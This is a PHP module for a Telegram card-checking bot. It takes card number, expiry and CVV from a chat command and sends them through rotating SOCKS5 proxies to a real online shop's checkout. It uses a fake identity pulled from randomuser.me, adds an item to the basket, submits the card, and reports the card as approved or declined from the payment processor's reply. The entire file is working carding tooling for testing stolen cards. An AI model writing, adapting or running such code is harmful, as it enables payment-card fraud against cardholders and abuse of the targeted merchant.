<?php
$cmd = Command($message);
if (strtolower($cmd['command']) == "adr") {  
$lista = $cmd['data'];

$NameGater ='Adriana';
$gateway = '/adr :'.$NameGater;
Contador($gateway);
is_credits();
deleteprm($userId);
Dcred($userId);
deltecred($userId);
is_gateroff($NameGater); //off Gater
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);


if(empty($lista)) $lista = $r_msg;
if(empty($lista)) $lista = $q_msg;

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'disable_web_page_preview' => true,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow AVS</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!adr card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if (isCardExpired($mes,$ano)) {
    $text = "<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow AVS</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>Card has expired. ⚠️</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code>
━━━━━━━━━━━━━━━━
</b>";
    bot('sendMessage',['chat_id' =>$chatId,'reply_to_message_id'=>$message_id, 'disable_web_page_preview' => true, 'parse_mode'=>'HTML','text' => $text]);
    return;
}

if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];



$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
antisppre($gId);


$rotate = rotate();
$socks5 = socks5();


$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5 ,"AUTH" => $rotate];

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);

$curl = new CurlX;
$cookie = uniqid();

$retries = 0;
$maxRetries = 3;

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }

if(strlen($ano) == 2){
  $ano = "20".$ano;
}

while ($retries < $maxRetries) {
    try {
        $req1 = $curl::Get("https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx", $headers = null, $cookie, $server);

        if ($req1->code != "200") {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
        $VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');

        if ($VIEWSTATE == "null" || $VIEWSTATEGENERATOR == "null") {
            throw new Exception("Error extrayendo VIEWSTATE o VIEWSTATEGENERATOR");
        }

        $req2 = $curl::Post('https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx',
$data = 'ctl00%24ctl00%24ScriptManager1=ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24BuyProductDialog1%24BuyProductPanel%7Cctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24BuyProductDialog1%24AddToBasketButton&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__VIEWSTATEENCRYPTED=&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24SimpleSearch1%24SearchPhrase=&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24BuyProductDialog1%24OurPrice%24VS=YM9lQs4ZXe%2Bl44hEXt1LZxGhbSdorF50XSGyaTltBhynkcFMgr6rPIen6WbDwxj2&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24BuyProductDialog1%24Quantity=1&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24MoreCategoryItems1%24ProductList%24ctl00%24Thumbnail%24ProductPrice%24VS=%2FqPrGI2MxnZ0OuZZF%2F%2B4iH%2By771CLv%2F7ypKh6vaTn7dc2IOZiN8%2FJ39M5gLB7ny4&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24MoreCategoryItems1%24ProductList%24ctl01%24Thumbnail%24ProductPrice%24VS=fGzB9Ll1QkfqewAYcVoiEPsU1uT8iDT4ALT1rwn0l3LFAv3vvUY26qj%2BcvTbxKzB&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24MoreCategoryItems1%24ProductList%24ctl02%24Thumbnail%24ProductPrice%24VS=DDVMl97O2ycn0iMjMVXU2ohwPh214YdYKc%2Fuf17FeR5n0ZkIZEAD3dH0uZT%2Bzk6m&ctl00%24ctl00%24NestedMaster%24RightSidebar%24ProductTellAFriendRight%24Name=&ctl00%24ctl00%24NestedMaster%24RightSidebar%24ProductTellAFriendRight%24FromEmail=&ctl00%24ctl00%24NestedMaster%24RightSidebar%24ProductTellAFriendRight%24FriendEmail=&ctl00%24ctl00%24PageFooter%24StoreFooter_F%24SubscribeToMailChimp1%24UserEmail=&__ASYNCPOST=true&ctl00%24ctl00%24NestedMaster%24PageContent%24ctl00%24BuyProductDialog1%24AddToBasketButton=%2B%20Add%20to%20Cart',
$headers = [
    'accept: */*',
'accept-language: es-ES,es;q=0.9',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://shop.kingnut.com',
'priority: u=1, i',
'referer: https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
'x-microsoftajax: Delta=true',
'x-requested-with: XMLHttpRequest',
] , $cookie,$server);
if ($req2->code != "200") {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}

$req1 = $curl::Get("https://shop.kingnut.com/Basket.aspx", $headers = null , $cookie,$server);

if ($req1->code != "200") {
    throw new Exception("Connection error on request attempt #3 " . $retries . ". Please try again.");
}
$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');

$req2 = $curl::Post('https://shop.kingnut.com/Basket.aspx',
$data = 'ctl00%24ctl00%24ScriptManager1=ctl00%24ctl00%24NestedMaster%24PageContent%24BasketPanel%7Cctl00%24ctl00%24NestedMaster%24PageContent%24CheckoutButton&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__VIEWSTATEENCRYPTED=&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24minicart1%24BasketRepeater%24ctl00%24Quantity=1&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24SimpleSearch1%24SearchPhrase=&ctl00%24ctl00%24NestedMaster%24PageContent%24BasketGrid%24ctl02%24Quantity=1&ctl00%24ctl00%24NestedMaster%24RightSidebar%24BasketShippingEstimate1%24Country=US&ctl00%24ctl00%24NestedMaster%24RightSidebar%24BasketShippingEstimate1%24Province=&ctl00%24ctl00%24NestedMaster%24RightSidebar%24BasketShippingEstimate1%24PostalCode=&ctl00%24ctl00%24PageFooter%24StoreFooter_F%24SubscribeToMailChimp1%24UserEmail=&__ASYNCPOST=true&ctl00%24ctl00%24NestedMaster%24PageContent%24CheckoutButton=Checkout%20%3E%3E',
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://shop.kingnut.com',
'priority: u=1, i',
'referer: https://shop.kingnut.com/Basket.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
'x-microsoftajax: Delta=true',
'x-requested-with: XMLHttpRequest',
] , $cookie,$server);

if ($req2->code != "200") {
    throw new Exception("Connection error on request attempt #5 " . $retries . ". Please try again.");
}


$req1 = $curl::Get("https://shop.kingnut.com/Checkout/EditBillAddress.aspx", $headers = null, $cookie,$server);

if ($req1->code != "200") {
    throw new Exception("Connection error on request attempt #6 " . $retries . ". Please try again.");
}
$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');

$req2 = $curl::Post('https://shop.kingnut.com/Checkout/EditBillAddress.aspx',
$data = '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24minicart1%24BasketRepeater%24ctl00%24Quantity=1&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24SimpleSearch1%24SearchPhrase=&ctl00%24ctl00%24NestedMaster%24PageContent%24UserName='.urlencode($email).'&ctl00%24ctl00%24NestedMaster%24PageContent%24Password=407d25146b14&ctl00%24ctl00%24NestedMaster%24PageContent%24ConfirmPassword=407d25146b14&ctl00%24ctl00%24NestedMaster%24PageContent%24FirstName='.$firstname.'&ctl00%24ctl00%24NestedMaster%24PageContent%24LastName='.$lastname.'&ctl00%24ctl00%24NestedMaster%24PageContent%24Company='.$lastname.'&ctl00%24ctl00%24NestedMaster%24PageContent%24Address1='.urlencode($street).'&ctl00%24ctl00%24NestedMaster%24PageContent%24Address2=&ctl00%24ctl00%24NestedMaster%24PageContent%24City='.urlencode($city).'&ctl00%24ctl00%24NestedMaster%24PageContent%24Country=US&ctl00%24ctl00%24NestedMaster%24PageContent%24Province2=WA&ctl00%24ctl00%24NestedMaster%24PageContent%24PostalCode='.$zip.'&ctl00%24ctl00%24NestedMaster%24PageContent%24Telephone='.urlencode($phone).'&ctl00%24ctl00%24NestedMaster%24PageContent%24Fax=&ctl00%24ctl00%24NestedMaster%24PageContent%24IsBusinessAddress=on&ctl00%24ctl00%24NestedMaster%24PageContent%24ShipToOption=SHIP_TO_BILLING_ADDRESS&ctl00%24ctl00%24NestedMaster%24PageContent%24ShippingContinueButton=Continue+Checkout+%3E%3E&ctl00%24ctl00%24NestedMaster%24PageContent%24BasketShippingEstimate1%24Country=US&ctl00%24ctl00%24NestedMaster%24PageContent%24BasketShippingEstimate1%24Province=&ctl00%24ctl00%24NestedMaster%24PageContent%24BasketShippingEstimate1%24PostalCode=&ctl00%24ctl00%24PageFooter%24StoreFooter_F%24SubscribeToMailChimp1%24UserEmail=',
$headers = [
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: es-ES,es;q=0.9',
'cache-control: max-age=0',
'content-type: application/x-www-form-urlencoded',
'origin: https://shop.kingnut.com',
'priority: u=0, i',
'referer: https://shop.kingnut.com/Checkout/EditBillAddress.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
] , $cookie,$server);

if ($req2->code != "200") {
    throw new Exception("Connection error on request attempt #7 " . $retries . ". Please try again.");
}

$VIEWSTATE = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');


$req2 = $curl::Post('https://shop.kingnut.com/Checkout/ShipMethod.aspx',
$data = '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24minicart1%24BasketRepeater%24ctl00%24Quantity=1&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24SimpleSearch1%24SearchPhrase=&ctl00%24ctl00%24NestedMaster%24PageContent%24ContinueButton=Continue+%3E%3E&txt_DefaultGiftMsg=&ctl00%24ctl00%24NestedMaster%24PageContent%24ShipmentRepeater%24ctl00%24ShipMethodsList=9&ctl00%24ctl00%24NestedMaster%24PageContent%24ShipmentRepeater%24ctl00%24ShipMessage=&ctl00%24ctl00%24PageFooter%24StoreFooter_F%24SubscribeToMailChimp1%24UserEmail='.urlencode($email).'',
$headers = [
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: es-ES,es;q=0.9',
'cache-control: max-age=0',
'content-type: application/x-www-form-urlencoded',
'origin: https://shop.kingnut.com',
'priority: u=0, i',
'referer: https://shop.kingnut.com/Checkout/ShipMethod.aspx',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
] , $cookie,$server);


if ($req2->code != "200") {
    throw new Exception("Connection error on request attempt #8 " . $retries . ". Please try again.");
}

$VIEWSTATE = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');

$ds = array("4"=>"1","5"=>"2","6"=>"4","3"=>"3",);
$card_type = $ds[substr($cc, 0,1)];


$req2 = $curl::Post('https://shop.kingnut.com/Checkout/Payment.aspx',
$data = 'ctl00%24ctl00%24ScriptManager1=ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentAjax%7Cctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24CreditCardButton&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24minicart1%24BasketRepeater%24ctl00%24Quantity=1&ctl00%24ctl00%24PageHeader%24StoreHeader_H%24SimpleSearch1%24SearchPhrase=&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CouponCode=&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24CardType='.$card_type.'&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24CardName='.$firstname.'%20'.$lastname.'&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24CardNumber='.$cc.'&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24ExpirationMonth='.$mes.'&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24ExpirationYear='.$ano.'&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24SecurityCode=232&ctl00%24ctl00%24PageFooter%24StoreFooter_F%24SubscribeToMailChimp1%24UserEmail='.urlencode($email).'&__ASYNCPOST=true&ctl00%24ctl00%24NestedMaster%24PageContent%24PaymentWidget%24CreditCardPaymentForm%24CreditCardButton=Processing...',
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://shop.kingnut.com',
'priority: u=1, i',
'referer: https://shop.kingnut.com/Checkout/Payment.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
'x-microsoftajax: Delta=true',
'x-requested-with: XMLHttpRequest',
] , $cookie,$server);
if ($req2->code != "200") {
    throw new Exception("Connection error on request attempt #9 " . $retries . ". Please try again.");
}

        break; // salir del bucle si todo sale bien
    } catch (Exception $e) {
        $retries++;
        echo "Intento $retries: " . $e->getMessage() . "\n";
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}

$mgs = trim(strip_tags($curl::ParseString($req2->body, '<div class="validationSummary">', '</div>')));

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if(substr_count($req2->body, 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.')){
$status = "APPROVED ✅ ";
$response = "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.";
}elseif ($error_messages == "Incorrect credit card expiration date."){ 
$status = "Rejected! 🔴";
$response = "Card Declined 🔴";
}elseif ($error_messages == 'Your order is confirmed'){ 
$status = "Approved!🟩";
$response = "Your order is confirmed(39$)🟩";
}else{
$status = "DECLINED #DEAD ❌";
$response = "$mgs";
   }
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



$free = antispFree($gId);
$premi = antisppre($gId);

}

